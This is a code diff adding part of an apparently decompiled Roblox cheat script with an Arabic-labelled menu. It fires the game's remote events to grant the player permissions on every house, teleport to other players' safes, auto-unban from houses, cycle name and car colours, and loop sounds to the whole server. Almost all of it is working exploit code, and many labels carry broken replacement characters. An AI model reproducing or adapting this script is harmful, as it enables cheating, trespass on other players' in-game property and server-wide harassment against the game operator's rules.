+    Name = '\u{fffd}\u{62e}\u{630} \u{62c}\u{645}\u{64a}\u{639} \u{62a}\u{62d}\u{643}\u{645} \u{627}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+})
+HouseTab:AddButton({
+    Name = '\u{fffd}\u{62e}\u{630} \u{62c}\u{645}\u{64a}\u{639} \u{62a}\u{62d}\u{643}\u{645} \u{627}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+    Callback = function()
+        for v564 = 1, 35 do
+            if v564 ~= 8 then
+                if v564 ~= 9 then
+                    if v564 ~= 10 then
+                        local v565 = {
+                            'GivePermissionLoopToServer',
+                            game:GetService('Players').LocalPlayer,
+                            v564,
+                        }
+
+                        game:GetService('ReplicatedStorage').RE:FindFirstChild('1Playe1rTrigge1rEven1t'):FireServer(unpack(v565))
+                    end
+                end
+            end
+        end
+
+        print('Permissions for all houses granted!')
+    end,
+})
+HouseTab:AddSection({
+    Name = '\u{fffd}\u{646}\u{642}\u{644} \u{644}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+})
+
+local u566 = nil
+
+local function u573(p567)
+    local v568 = workspace['001_Lots']:FindFirstChild(p567 .. 'House')
+
+    if v568 then
+        local _HousePickedByPlayer = v568:FindFirstChild('HousePickedByPlayer')
+        local v570 = _HousePickedByPlayer and _HousePickedByPlayer:FindFirstChild('HouseModel')
+
+        if v570 then
+            local __001_Safe = v570:FindFirstChild('001_Safe')
+            local v572 = __001_Safe and __001_Safe:FindFirstChild('OpenSafeDoorButton')
+
+            if v572 then
+                return v572
+            end
+        end
+    else
+        u212:MakeNotification({
+            Name = '\u{fffd}\u{637}\u{627}\u{621}',
+            Content = 'Casa n\u{e3}o encontrada, atualize a tabela ou tente novamente com uma existente.',
+            Image = 'rbxassetid://4483345998',
+            Time = 3,
+        })
+    end
+
+    return nil
+end
+local function u579()
+    local v574, v575, v576 = pairs(workspace['001_Lots']:GetChildren())
+    local v577 = {}
+
+    while true do
+        local v578
+
+        v576, v578 = v574(v575, v576)
+
+        if v576 == nil then
+            break
+        end
+        if string.find(v578.Name, 'House') and v578:FindFirstChild('HousePickedByPlayer') then
+            table.insert(v577, v578.Owner.Value .. '-' .. v578.Number.Number.Value)
+        end
+    end
+
+    return v577
+end
+
+local u580 = nil
+
+local function u583()
+    u580 = HouseTab:AddDropdown({
+        Name = '\u{fffd}\u{62e}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{628}\u{64a}\u{62a}:',
+        Default = '',
+        Options = u579(),
+        Callback = function(p581)
+            if p581 and p581 ~= '' then
+                local v582 = string.split(p581, '-')
+
+                u566 = tostring(v582[1])
+            end
+        end,
+    })
+end
+
+u583()
+
+local function u584()
+    u566 = nil
+
+    u580:Destroy()
+    u583()
+    u212:MakeNotification({
+        Name = '\u{fffd}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}',
+        Content = 'Lista de casas atualizada!',
+        Image = 'rbxassetid://115714662895227',
+        Time = 3,
+    })
+end
+
+HouseTab:AddButton({
+    Name = '\u{fffd}\u{646}\u{642}\u{644} \u{644}\u{644} \u{62e}\u{632}\u{646}\u{629} ',
+    Callback = function()
+        if u566 then
+            if workspace['001_Lots']:FindFirstChild(u566 .. 'House') then
+                local v585 = u573(u566)
+
+                if v585 then
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v585.Position)
+                else
+                    u212:MakeNotification({
+                        Name = 'Erro',
+                        Content = 'Cofre n\u{e3}o encontrado na casa ' .. tostring(u566),
+                        Image = 'rbxassetid://115714662895227',
+                        Time = 3,
+                    })
+                end
+            else
+                u212:MakeNotification({
+                    Name = 'Erro',
+                    Content = 'Casa n\u{e3}o encontrada, atualize a tabela ou selecione uma existente.',
+                    Image = 'rbxassetid://115714662895227',
+                    Time = 3,
+                })
+            end
+        end
+    end,
+})
+HouseTab:AddButton({
+    Name = '\u{fffd}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{644}\u{642}\u{627}\u{626}\u{645}\u{629}',
+    Callback = function()
+        u584()
+    end,
+})
+HouseTab:AddSection({
+    Name = '\u{fffd}\u{646}\u{642}\u{644} \u{644}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+})
+
+local u586 = {
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 1'] = Vector3.new(260.29, 4.37, 209.32),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 2'] = Vector3.new(234.49, 4.37, 228),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 3'] = Vector3.new(262.79, 21.37, 210.84),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 4'] = Vector3.new(229.6, 21.37, 225.4),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 5'] = Vector3.new(173.44, 21.37, 228.11),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 6'] = Vector3.new(-43, 21, -137),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 7'] = Vector3.new(-40, 36, -137),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 11'] = Vector3.new(-21, 40, 436),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 12'] = Vector3.new(155, 37, 433),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 13'] = Vector3.new(255, 35, 431),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 14'] = Vector3.new(254, 38, 394),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 15'] = Vector3.new(148, 39, 387),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 16'] = Vector3.new(-17, 42, 395),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 17'] = Vector3.new(-189, 37, -247),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 18'] = Vector3.new(-354, 37, -244),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 19'] = Vector3.new(-456, 36, -245),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 20'] = Vector3.new(-453, 38, -295),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 21'] = Vector3.new(-356, 38, -294),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 22'] = Vector3.new(-187, 37, -295),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 23'] = Vector3.new(-410, 68, -447),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 24'] = Vector3.new(-348, 69, -496),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 28'] = Vector3.new(-103, 12, 1087),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 29'] = Vector3.new(-730, 6, 808),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 30'] = Vector3.new(-245, 7, 822),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 31'] = Vector3.new(639, 76, -361),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 32'] = Vector3.new(-908, 6, -361),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 33'] = Vector3.new(-111, 70, -417),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 34'] = Vector3.new(230, 38, 569),
+    ['\u{fffd}\u{64a}\u{62a} \u{631}\u{642}\u{645} 35'] = Vector3.new(-30, 13, 2209),
+}
+local v587, v588, v589 = pairs(u586)
+local v590 = {}
+
+while true do
+    local v591
+
+    v589, v591 = v587(v588, v589)
+
+    if v589 == nil then
+        break
+    end
+
+    table.insert(v590, v589)
+end
+
+table.sort(v590, function(p592, p593)
+    return (tonumber(p592:match('%d+')) or 0) < (tonumber(p593:match('%d+')) or 0)
+end)
+HouseTab:AddDropdown({
+    Name = '\u{fffd}\u{646}\u{642}\u{644} \u{644}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+    Options = v590,
+    Callback = function(p594)
+        local _LocalPlayer15 = game.Players.LocalPlayer
+
+        if _LocalPlayer15 and _LocalPlayer15.Character then
+            _LocalPlayer15.Character.HumanoidRootPart.CFrame = CFrame.new(u586[p594])
+        end
+    end,
+})
+HouseTab:AddSection({
+    Name = '\u{fffd}\u{643} \u{627}\u{644}\u{628}\u{627}\u{646}\u{62f} \u{639}\u{646} \u{627}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+})
+HouseTab:AddToggle({
+    Name = '\u{fffd}\u{636}\u{63a}\u{637} \u{644}\u{627}\u{632}\u{627}\u{644}\u{647} \u{627}\u{644}\u{62d}\u{636}\u{631} \u{645}\u{646} \u{643}\u{644} \u{627}\u{644}\u{628}\u{64a}\u{648}\u{62a}',
+    Default = false,
+    Callback = function(p596)
+        isUnbanActive = p596
+
+        if isUnbanActive then
+            print('Auto Unban Activated')
+            startAutoUnban()
+        else
+            print('Auto Unban Deactivated')
+        end
+    end,
+})
+
+local v597 = v71:MakeTab({
+    Name = '\u{fffd}\u{644}\u{627}\u{633}\u{645}\u{627}\u{621}',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+v597:AddSection({
+    Name = '\u{fffd}\u{644}\u{648}\u{64a}\u{646} \u{627}\u{644}\u{627}\u{633}\u{645}',
+})
+
+local u598 = false
+local u599 = nil
+local u600 = {
+    Color3.new(1, 0.215, 0.223),
+    Color3.new(1, 0.419, 0.267),
+    Color3.new(1, 0.681, 0.129),
+    Color3.new(0.867, 1, 0.304),
+    Color3.new(0.612, 1, 0.273),
+    Color3.new(0.229, 1, 0.53),
+    Color3.new(0.116, 0.754, 1),
+    Color3.new(0, 0.078, 1),
+    Color3.new(0.424, 0, 1),
+    Color3.new(1, 0, 0.149),
+}
+local __1RPNam1eColo1r = game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1RPNam1eColo1r')
+
+v597:AddToggle({
+    Name = '\u{fffd}\u{633}\u{645} \u{645}\u{644}\u{648}\u{646}',
+    Flag = 'RGBNameToggle',
+    Callback = function(p602)
+        u598 = p602
+
+        if p602 then
+            u599 = task.spawn(function()
+                while u598 do
+                    local v603, v604, v605 = ipairs(u600)
+
+                    while true do
+                        local v606
+
+                        v605, v606 = v603(v604, v605)
+
+                        if v605 == nil or not u598 then
+                            break
+                        end
+
+                        __1RPNam1eColo1r:FireServer('PickingRPNameColor', v606)
+                        task.wait(0.2)
+                    end
+                end
+            end)
+        elseif u599 then
+            task.cancel(u599)
+        end
+    end,
+})
+
+local u607 = false
+local u608 = nil
+local u609 = {
+    Color3.new(1, 0.292, 0.129),
+    Color3.new(1, 0.498, 0.053),
+    Color3.new(1, 0.995, 0.249),
+    Color3.new(0.051, 1, 0.159),
+    Color3.new(0.111, 0.809, 1),
+    Color3.new(0.074, 0.044, 1),
+    Color3.new(0.556, 0.123, 1),
+    Color3.new(1, 0.002, 0.802),
+    Color3.new(1, 0.029, 0.027),
+}
+
+v597:AddToggle({
+    Name = '\u{fffd}\u{627}\u{64a}\u{648} \u{645}\u{644}\u{648}\u{646}',
+    Flag = 'RGBBioToggle',
+    Callback = function(p610)
+        u607 = p610
+
+        if p610 then
+            u608 = task.spawn(function()
+                while u607 do
+                    local v611, v612, v613 = ipairs(u609)
+
+                    while true do
+                        local v614
+
+                        v613, v614 = v611(v612, v613)
+
+                        if v613 == nil or not u607 then
+                            break
+                        end
+
+                        __1RPNam1eColo1r:FireServer('PickingRPBioColor', v614)
+                        task.wait(0.2)
+                    end
+                end
+            end)
+        elseif u608 then
+            task.cancel(u608)
+        end
+    end,
+})
+v597:AddSection({
+    Name = '\u{fffd}\u{64e}\u{633}\u{64e}\u{645}\u{64e}\u{623}\u{64e}\u{621} \u{628}\u{64e}\u{646}\u{650}\u{623}\u{64e}\u{62a}\u{64e}',
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{645}\u{633}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{652}\u{645}\u{64e}\u{633}\u{64e}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{639}\u{627}\u{621}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{651}\u{639}\u{640}\u{627}\u{621}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{645}\u{627}\u{631}\u{647}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{640}\u{645}\u{627}\u{631}\u{647}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{645} \u{639}\u{628}\u{64a}\u{633}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{645} \u{627}\u{639}\u{640}\u{628}\u{64a}\u{640}\u{633}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{64a}\u{645}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64c}\u{64a}\u{64f}\u{645}\u{64e}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{64a}\u{644}\u{649}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{652}\u{64a}\u{64f}\u{644}\u{652}\u{649}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{642}\u{64a}\u{629}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64c}\u{642}\u{64f}\u{64a}\u{64f}\u{629}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{64a}\u{646}\u{628}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64d}\u{64a}\u{646}\u{640}\u{650}\u{650}\u{640}\u{650}\u{640}\u{628}\u{640}\u{64c}\u{640}\u{64c}\u{64c}\u{640}\u{64c}\u{64c}\u{64c}\u{640}\u{64c}\u{64c}\u{640}\u{64c}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{647}\u{62f}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{647}\u{62f}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{631}\u{64a}\u{645}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{640}\u{652}\u{640}\u{652}\u{652}\u{640}\u{652}\u{631}\u{64a}\u{645}\u{640}\u{652}\u{640}\u{652}\u{652}\u{640}\u{652}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{627}\u{637}\u{645}\u{647}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{640}\u{622}\u{637}\u{640}\u{645}\u{64e}\u{647}\u{64f}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{647}\u{631}\u{627}\u{621}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{647}\u{64f}\u{631}\u{64c}\u{623}\u{64e}\u{621}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{631}\u{62c}\u{633}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', ' \u{646}\u{650}\u{631}\u{64c}\u{62c}\u{650}\u{633}\u{64e}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{648}\u{631}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{650}\u{648}\u{64c}\u{631}\u{64c}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{633}\u{631}\u{627}\u{621}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{633}\u{64e}\u{631}\u{64c}\u{623}\u{64e}\u{621}')
+    end,
+})
+v597:AddSection({
+    Name = '\u{fffd}\u{64e}\u{633}\u{64e}\u{645}\u{64e}\u{623}\u{64e}\u{621} \u{648}\u{64c}\u{644}\u{62f}\u{64f}',
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{627}\u{631}\u{62a}\u{646}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{627}\u{631}\u{62a}\u{646}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{648}\u{646}\u{640}\u{64a}\u{6aa}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{648}\u{646}\u{640}\u{64a}\u{6aa}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{631}\u{628}\u{631}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{640}\u{631}\u{628}\u{640}\u{631}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{627}\u{633}\u{640}\u{645}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{640}\u{627}\u{633}\u{640}\u{645}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{627}\u{633}\u{64a}\u{646}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{640}\u{627}\u{633}\u{64a}\u{640}\u{646}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{64a}\u{62a}\u{627}\u{634}\u{64a}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{64a}\u{64f}\u{62a}\u{64e}\u{623}\u{64e}\u{634}\u{652}\u{64a}\u{64f}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{644}\u{64a}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64f}\u{644}\u{652}\u{64a}\u{64f}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{633}\u{64a}\u{646}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{633}\u{64e}\u{64a}\u{64f}\u{646}\u{650}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{631}\u{627}\u{631}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{640}\u{631}\u{627}\u{631}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{645}\u{627}\u{631}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64f}\u{645}\u{64e}\u{623}\u{64e}\u{631}\u{64c}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{62d}\u{645}\u{62f}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{62d}\u{64e}\u{645}\u{64e}\u{62f}\u{64f}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{62c}\u{62a}\u{628}\u{649}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{62c}\u{650}\u{62a}\u{64e}\u{628}\u{64e}\u{649}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{633}\u{64a}\u{646} ',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{633}\u{64e}\u{646}\u{650}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{647}\u{645}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{652}\u{647}\u{64f}\u{645}\u{64e}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{64a}\u{641}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{64a}\u{64f}\u{641}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{648}\u{633}\u{641}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', ' \u{64a}\u{64f}\u{648}\u{64c}\u{633}\u{64e}\u{641}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{628}\u{62f}\u{627}\u{644}\u{644}\u{647}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64f}\u{628}\u{64e}\u{630}\u{623}\u{64e}\u{644}\u{652}\u{644}\u{652}\u{647}\u{64f}')
+    end,
+})
+v597:AddButton({
+    Name = '\u{fffd}\u{648}\u{633}\u{649}',
+    Callback = function()
+        game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', '\u{fffd}\u{64e}\u{648}\u{64c}\u{633}\u{64e}\u{649}')
+    end,
+})
+
+local u615 = {
+    Color3.new(1, 0, 0),
+    Color3.new(0, 1, 0),
+    Color3.new(0, 0, 1),
+    Color3.new(1, 1, 0),
+    Color3.new(1, 0, 1),
+    Color3.new(0, 1, 1),
+    Color3.new(0.5, 0, 0.5),
+    Color3.new(1, 0.5, 0),
+}
+local __1Player1sCa1r = game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1Player1sCa1r')
+local u617 = false
+
+local function u622()
+    while u617 do
+        local v618, v619, v620 = ipairs(u615)
+
+        while true do
+            local v621
+
+            v620, v621 = v618(v619, v620)
+
+            if v620 == nil then
+                break
+            end
+            if not u617 then
+                return
+            end
+
+            __1Player1sCa1r:FireServer(unpack({
+                'PickingCarColor',
+                v621,
+            }))
+            wait(1)
+        end
+    end
+end
+
+local v623 = v71:MakeTab({
+    Name = '\u{fffd}\u{644}\u{627}\u{63a}\u{640}\u{627}\u{646}\u{64a} \u{645}\u{62c}\u{640}\u{627}\u{646}\u{64a}\u{629}',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+v623:AddSection({
+    Name = '\u{fffd}\u{63a}\u{627}\u{646}\u{64a} \u{645}\u{62c}\u{627}\u{646}\u{64a}\u{629} \u{627}\u{62e}\u{62a}\u{627}\u{631}\u{647}\u{627}',
+})
+v623:AddDropdown({
+    Name = '\u{fffd}\u{62e}\u{640}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{627}\u{63a}\u{640}\u{646}\u{64a}\u{629} \u{627}\u{644}\u{62a}\u{640}\u{631}\u{64a}\u{640}\u{62f}\u{647}\u{627}',
+    Default = 'Select a sound...',
+    Options = soundNames,
+    Callback = function(p624)
+        local v625, v626, v627 = ipairs(sounds)
+
+        while true do
+            local v628
+
+            v627, v628 = v625(v626, v627)
+
+            if v627 == nil then
+                break
+            end
+            if v628.name == p624 then
+                playSound(v628.id)
+
+                break
+            end
+        end
+    end,
+})
+v623:AddSection({
+    Name = '\u{fffd}\u{63a}\u{627}\u{646}\u{64a} \u{645}\u{62c}\u{627}\u{646}\u{64a}\u{629} \u{62a}\u{636}\u{647}\u{631} \u{644}\u{644}\u{633}\u{64a}\u{631}\u{641}\u{631} \u{643}\u{627}\u{645}\u{644}',
+})
+
+local u629 = {
+    {
+        name = '\u{fffd}\u{64a}\u{633}\u{648}\u{633}\u{633}\u{633}\u{633} ',
+        id = 78275845721592,
+    },
+    {
+        name = '\u{fffd}\u{631}\u{627}\u{62e} 1',
+        id = 270145703,
+    },
+    {
+        name = '\u{fffd}\u{631}\u{627}\u{62e} 2',
+        id = 18131809532,
+    },
+    {
+        name = '\u{fffd}\u{628}1 ',
+        id = 6536444735,
+    },
+    {
+        name = '\u{fffd}\u{628}2',
+        id = 8701632845,
+    },
+    {
+        name = '\u{fffd}\u{628}3 ',
+        id = 7590164518,
+    },
+    {
+        name = 'SUS',
+        id = 7705506391,
+    },
+    {
+        name = '\u{fffd}\u{639}\u{639}\u{639}\u{639}',
+        id = 7772283448,
+    },
+    {
+        name = '\u{fffd}\u{64a}\u{64a}\u{64a}',
+        id = 18786647417,
+    },
+    {
+        name = 'Bat Hit',
+        id = 7129073354,
+    },
+    {
+        name = '\u{fffd}\u{628}\u{643}\u{647}',
+        id = 90807238125839,
+    },
+    {
+        name = '\u{fffd}\u{644}\u{645}\u{62d}\u{645}\u{636}\u{64a}\u{646}',
+        id = 133188753831517,
+    },
+    {
+        name = 'Estora t\u{ed}mpano',
+        id = 268116333,
+    },
+}
+local v630, v631, v632 = ipairs(u629)
+local u633 = u617
+local v634 = {}
+local u635 = nil
+local u636 = nil
+
+while true do
+    local v637
+
+    v632, v637 = v630(v631, v632)
+
+    if v632 == nil then
+        break
+    end
+
+    table.insert(v634, v637.name)
+end
+
+v623:AddTextbox({
+    Name = '\u{fffd}\u{640}\u{644}\u{64a} \u{643}\u{640}\u{648}\u{62f} \u{627}\u{644}\u{627}\u{63a}\u{640}\u{646}\u{64a}\u{629} ',
+    Default = '',
+    Callback = function(p638)
+        u635 = tonumber(p638)
+    end,
+})
+v623:AddDropdown({
+    Name = '\u{fffd}\u{62e}\u{640}\u{62a}\u{627}\u{631} \u{627}\u{644}\u{623}\u{63a}\u{640}\u{646}\u{64a}\u{629}',
+    Default = v634[1],
+    Options = v634,
+    Callback = function(p639)
+        local v640, v641, v642 = ipairs(u629)
+
+        while true do
+            local v643
+
+            v642, v643 = v640(v641, v642)
+
+            if v642 == nil then
+                break
+            end
+            if v643.name == p639 then
+                u635 = v643.id
+
+                break
+            end
+        end
+    end,
+})
+v623:AddButton({
+    Name = '\u{fffd}\u{640}\u{634}\u{63a}\u{64a}\u{644} \u{627}\u{644}\u{627}\u{63a}\u{640}\u{646}\u{64a}\u{629} \u{645}\u{62f}\u{629} \u{663} \u{62b}\u{648}\u{627}\u{646}\u{64a}',
+    Callback = function()
+        playAudio()
+    end,
+})
+task.spawn(function()
+    while true do
+        if audioLoop and not currentSound then
+            playAudio()
+        end
+
+        task.wait(0.1)
+    end
+end)
+
+local u644 = false
+local u645 = nil
+
+v623:AddToggle({
+    Name = '\u{fffd}\u{628}\u{640}\u{627}\u{645} \u{627}\u{644}\u{627}\u{63a}\u{640}\u{646}\u{64a}\u{629} \u{639}\u{627}\u{62f}\u{64a}',
+    Default = false,
+    Callback = function(p646)
+        u644 = p646
+
+        if u644 or not u645 then
+            if u644 and not u645 then
+                playAudio()
+            end
+        else
+            u645:Stop()
+
+            u645 = nil
+        end
+    end,
+})
+
+local u647 = false
+
+v597:AddSection({
+    'Loop de Audio',
+})
+
+local function u650()
+    while u647 do
+        if u635 then
+            local v648 = {
+                game:GetService('Workspace'),
+                u635,
+                1,
+            }
+
+            game:GetService('ReplicatedStorage').RE:FindFirstChild('1Gu1nSound1s'):FireServer(unpack(v648))
+
+            local _Sound = Instance.new('Sound')
+
+            _Sound.SoundId = 'rbxassetid://' .. u635
+            _Sound.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+            _Sound:Play()
+        else
+            warn('Nenhum \u{e1}udio selecionado!')
+        end
+
+        task.wait(0.5)
+    end
+end
+
+v623:AddToggle({
+    Name = '\u{fffd}\u{628}\u{627}\u{645} \u{644}\u{644} \u{627}\u{63a}\u{627}\u{646}\u{64a} \u{633}\u{631}\u{64a}\u{639} \u{62c}\u{62f}\u{627}',
+    Description = 'Ativa o loop do \u{e1}udio',
+    Default = false,
+    Flag = 'audio_loop',
+    Callback = function(p651)
+        u647 = p651
+
+        if u647 then
+            task.spawn(u650)
+        end
+    end,
+})
+
+local function u653()
+    if u635 then
+        if u645 then
+            u645:Stop()
+        end
+
+        local v652 = {
+            game:GetService('Workspace'),
+            u635,
+            1,
+        }
+
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1Gu1nSound1s'):FireServer(unpack(v652))
+
+        u645 = Instance.new('Sound')
+        u645.SoundId = 'rbxassetid://' .. u635
+        u645.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+        u645:Play()
+        u645.Ended:Connect(function()
+            if u647 then
+                u653()
+            end
+        end)
+    else
+        warn('Nenhum \u{e1}udio selecionado!')
+    end
+end
+
+local _ReplicatedStorage8 = game:GetService('ReplicatedStorage')
+local u655 = 6314880174
+
+local function u662(p656)
+    local function u658()
+        local _Audioallclient = workspace:FindFirstChild('Audio all client')
+
